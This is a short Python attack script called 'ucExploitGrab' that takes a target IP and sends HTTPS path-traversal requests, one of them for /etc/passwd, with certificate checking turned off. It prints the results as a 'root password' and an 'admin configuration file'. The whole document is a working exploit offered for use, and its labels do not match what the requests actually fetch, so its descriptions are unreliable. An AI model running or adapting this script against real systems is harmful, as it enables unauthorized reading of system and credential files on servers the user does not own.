import urllib.request
import sys
from colorama import Style, Fore
from urllib.parse import urljoin
import ssl

print(Fore.GREEN + "\n[!] ucExploitGrab [!]" + Style.RESET_ALL)

if len(sys.argv) < 2:
    print(Fore.RED + "Usage: python3 " + sys.argv[0] + " <target_ip>" + Style.RESET_ALL)
    sys.exit(1)

host = sys.argv[1]

fileDir = "/../../../../.."
fileDir1 = "/../../../../../../../../etc/passwd"

print(Fore.RED + "Exploit process... \n" + Style.RESET_ALL)

url1 = f"https://{host}{fileDir}"
url2 = f"https://{host}{fileDir1}"


context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

try:
    print(Fore.GREEN + "[!] Getting root password..." + Style.RESET_ALL)
    response1 = urllib.request.urlopen(url1, context=context)
    print(response1.read())

except Exception as e:
    print(Fore.RED + "Error retrieving root password:", e)

try:
    print(Fore.GREEN + "\n[!] Getting admin configuration file..." + Style.RESET_ALL)
    response2 = urllib.request.urlopen(url2, context=context)
    print(response2.read())

except Exception as e:
    print(Fore.RED + "Error retrieving admin configuration file:", e)